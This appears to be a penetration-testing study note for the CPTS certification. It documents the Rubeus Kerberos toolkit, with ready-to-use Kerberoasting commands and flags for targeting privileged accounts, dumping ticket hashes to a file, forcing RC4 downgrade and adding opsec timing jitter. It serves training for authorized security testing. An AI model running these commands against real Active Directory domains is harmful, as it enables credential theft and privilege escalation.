---
tags: [cpts, tool, rubeus, kerberos, kerberoasting]
---

# 🧰 Rubeus

## 📦 Install
See [[Tool-Install]].

## 🎯 Purpose
Windows C# Kerberos interaction/abuse toolkit (GhostPack) — Kerberoasting, ticket manipulation, alternate creds, encryption-type control.

## 🧱 Core syntax
```powershell
.\Rubeus.exe kerberoast
```

## 🚩 Useful flags
```text
/spn:"$SPN"                       # target one SPN
/user:$USER                        # target one user
/domain:$DOMAIN
/dc:$DC
/outfile:$FILE                     # save hashes to file
/simple                            # simpler output format
/creduser:$DOM\$USER /credpassword:$PASS   # alternate credentials
/ticket:$BASE64_OR_KIRBI           # use an existing TGT
/usetgtdeleg                       # tgtdeleg technique (RC4 downgrade attempt, DC-version dependent)
/stats                             # enumerate only, no ticket requests
/ldapfilter:'admincount=1'         # narrow to privileged accounts
/pwdsetafter:$DATE /pwdsetbefore:$DATE /resultlimit:$N
/delay:$MS /jitter:$PCT            # opsec timing
/aes                               # request AES tickets
/nowrap                            # keep hash output on one line
```

## 🔧 Variants
```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:$USER /nowrap
.\Rubeus.exe kerberoast /domain:$DOMAIN /dc:$DC_IP /outfile:hashes.txt
```

#rubeus #kerberoasting #cpts
